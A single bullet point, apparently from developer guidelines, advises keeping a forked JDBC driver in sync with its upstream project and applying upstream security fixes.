- If you are forking an existing JDBC driver, make sure you stay up to date with the upstream driver and ensure you are applying particularly security fixes
